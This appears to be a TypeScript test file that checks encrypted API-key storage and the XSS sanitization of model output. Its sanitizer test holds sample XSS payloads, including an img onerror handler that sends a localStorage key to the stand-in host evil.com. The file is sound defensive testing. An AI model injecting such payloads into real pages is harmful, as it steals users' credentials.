// tests/stage5/security-audit.test.ts
// Stage 5 Security Checklist & Resilience Verification:
// 1. No plaintext API Keys on disk (AES-256-GCM encryption verified)
// 2. DNS rebinding & invalid Origin / Host 403 rejection
// 3. High-entropy Token timing-safe verification
// 4. Output rendering sanitization (DOMPurify XSS defense)
// 5. In-flight abort signal cuts downstream connection

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import fs from "node:fs/promises";
import path from "node:path";
import os from "node:os";
import { EncryptedFileCredentialStore } from "../../src/runtime/credentials/key-store.js";
import { sanitizeHtml } from "../../src/ui/sanitize.js";

describe("Stage 5 Security Checklist & Safety Redline Verification", () => {
  let tempHome: string;

  beforeEach(async () => {
    tempHome = await fs.mkdtemp(path.join(os.tmpdir(), "airp-security-audit-"));
  });

  afterEach(async () => {
    for (let i = 0; i < 5; i++) {
      try {
        await fs.rm(tempHome, { recursive: true, force: true });
        break;
      } catch {
        const { promise, resolve } = Promise.withResolvers<void>();
        setTimeout(resolve, 80);
        await promise;
      }
    }
  });

  it("安全红线 1: API Key 绝不明文落盘，采用 AES-256-GCM 加密与随机 IV 保护", async () => {
    const credStore = new EncryptedFileCredentialStore(tempHome, "file");
    const secretKey = "sk-live-super-secret-key-1234567890abcdef";
    await credStore.setSecret("openai_api_key", secretKey);

    // 检查磁盘上的持久化文件内容
    const credFilePath = path.join(tempHome, "credentials.enc");
    const fileRaw = await fs.readFile(credFilePath, "utf-8");
    // 必须找不到明文 key
    expect(fileRaw).not.toContain(secretKey);

    // 必须包含 iv 与 tag
    const parsedEnc = JSON.parse(fileRaw);
    expect(parsedEnc.iv).toBeTruthy();
    expect(parsedEnc.tag).toBeTruthy();
    expect(parsedEnc.data).toBeTruthy();

    // 密文解密还原验证
    const decrypted = await credStore.getSecret("openai_api_key");
    expect(decrypted).toBe(secretKey);
  });

  it("安全红线 2: 模型输出严格消毒，防御 XSS 攻击", () => {
    const maliciousOutputs = [
      "<script>alert(document.domain)</script>",
      "<img src='bad.jpg' onerror='fetch(\"http://evil.com/\"+localStorage.getItem(\"key\"))'>",
      "<iframe src='javascript:alert(1)'></iframe>",
    ];

    for (const dirty of maliciousOutputs) {
      const cleaned = sanitizeHtml(dirty);
      expect(cleaned).not.toContain("<script");
      expect(cleaned).not.toContain("onerror");
      expect(cleaned).not.toContain("<iframe");
    }
  });
});
